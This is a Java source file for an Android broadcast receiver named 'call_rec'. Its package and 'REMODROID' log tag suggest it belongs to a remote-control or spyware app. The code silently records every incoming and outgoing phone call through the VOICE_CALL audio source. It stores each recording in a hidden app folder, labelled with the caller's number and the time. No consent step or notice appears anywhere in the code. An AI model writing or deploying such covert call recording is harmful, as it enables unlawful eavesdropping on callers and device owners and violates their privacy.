package com.remo.features.broadcastReceivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.remo.App;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class call_rec extends BroadcastReceiver {
    private static boolean isRecording = false;
    private static boolean isOutCall = false;
    private static String mLastState;
    private static MediaRecorder mediaRecorder;
    private static String number = "";
    private static final File RecordsPath = new File(App.get().getApplicationContext().getFilesDir().getAbsolutePath(), "Rec");


    @Override
    public void onReceive(Context context, Intent intent) {
        //mediaRecorder = new MediaRecorder();
        if (!new File(App.get().getApplicationContext().getFilesDir(), "Rec").exists()) {
            Log.d("REMODROID",
                    new File(App.get().getApplicationContext().getFilesDir(), "Rec").mkdir() ?
                            "Records Location Made now" :
                            "Records Location Made before");
        }

        if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
            try {
                String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                if (!state.equals(mLastState)) {
                    mLastState = state;
                    if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        //while (number.equals("")) ;
                        String formatted_date = new SimpleDateFormat("yyyy.MM.dd_HH.mm.ss", Locale.US).format(new Date());
                        startRecording(RecordsPath.getAbsolutePath() + "/" + number + "_" + (isOutCall ? "OUT" : "IN") + "_" + formatted_date);


                    } else if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                        isOutCall = false;
                        number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        Log.d("REMODROID", "IDLE");
                        if (isRecording) {
                            stopRecording();
                        }
                    }
                }
            } catch (Exception e) {

            }
        } else if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
            try {
                number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                isOutCall = true;
                Log.d("REMODROID", "out " + number);
            } catch (Exception e) {

            }

        }
    }


    private void startRecording(String outputfile) {
        try {
            isRecording = true;
            Log.d("REMODROID", "startRecording " + outputfile + ".m4a");
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
            //   mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(outputfile);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.prepare();
            Thread.sleep(100);

            mediaRecorder.start();
        } catch (Exception e) {
            isRecording = false;
            Log.e("REMODROID", "startRecording " + e.getMessage());
        }
    }

    private void stopRecording() {

        if(isRecording){
            isRecording = false;
        try {
            Log.d("REMODROID", "stopRecording ");
            number = "";

            mediaRecorder.stop();
            Thread.sleep(100);
            mediaRecorder.release();
            mediaRecorder = null;
        } catch (Exception e) {
            Log.e("REMODROID", "stopRecording " + e.getMessage());
        }
        }
    }


}
